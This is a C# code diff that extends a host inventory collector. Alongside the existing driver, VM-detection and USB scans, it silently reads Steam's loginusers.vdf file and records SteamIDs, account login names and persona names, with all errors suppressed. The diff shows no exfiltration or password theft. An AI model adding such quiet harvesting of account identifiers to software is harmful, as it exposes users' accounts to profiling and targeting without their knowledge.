@@ -30,6 +30,7 @@ public static class HostInventoryCollector
         try { CollectDrivers(inv); } catch { }
         try { inv.Vm = DetectVm(); } catch { }
         try { CollectUsb(inv); } catch { }
+        try { CollectSteamAccounts(inv); } catch { }
         return inv;
     }
 
@@ -145,6 +146,62 @@ public static class HostInventoryCollector
             }
         }
         catch { /* SYSTEM hive needs admin -> skip */ }
+    }
+
+    // --- Steam accounts (loginusers.vdf) ---------------------------------------
+
+    private static void CollectSteamAccounts(HostInventory inv)
+    {
+        var steamPath = Registry.GetValue(
+            @"HKEY_CURRENT_USER\Software\Valve\Steam", "SteamPath", null) as string;
+        if (string.IsNullOrEmpty(steamPath)) return;
+
+        var vdf = Path.Combine(steamPath, "config", "loginusers.vdf");
+        if (!File.Exists(vdf)) return;
+
+        string[] lines;
+        try { lines = File.ReadAllLines(vdf, System.Text.Encoding.UTF8); }
+        catch { return; }
+
+        // Minimal VDF parser for the flat two-level structure:
+        // "users" { "steamid64" { "AccountName" "..." "PersonaName" "..." } }
+        SteamAccountInfo? current = null;
+        int depth = 0;
+
+        foreach (var raw in lines)
+        {
+            var line = raw.Trim();
+            if (line == "{") { depth++; continue; }
+            if (line == "}")
+            {
+                if (depth == 2 && current != null) { inv.SteamAccounts.Add(current); current = null; }
+                depth--;
+                continue;
+            }
+
+            if (depth == 1 && line.StartsWith('"') && line.EndsWith('"'))
+            {
+                var id = line.Trim('"');
+                if (id.Length >= 17 && long.TryParse(id, out _))
+                    current = new SteamAccountInfo { SteamId = id };
+                continue;
+            }
+
+            if (depth == 2 && current != null)
+            {
+                var m = System.Text.RegularExpressions.Regex.Match(
+                    line, @"""([^""]+)""\s+""([^""]*)""");
+                if (!m.Success) continue;
+                switch (m.Groups[1].Value.ToLowerInvariant())
+                {
+                    case "accountname": current.AccountName = m.Groups[2].Value; break;
+                    case "personaname": current.PersonaName = m.Groups[2].Value; break;
+                    case "mostrecent": current.MostRecent = m.Groups[2].Value == "1"; break;
+                }
+            }
+        }
+        if (inv.SteamAccounts.Count > 20)
+            inv.SteamAccounts = inv.SteamAccounts.Take(20).ToList();
     }
 
     // --- helpers ---------------------------------------------------------------
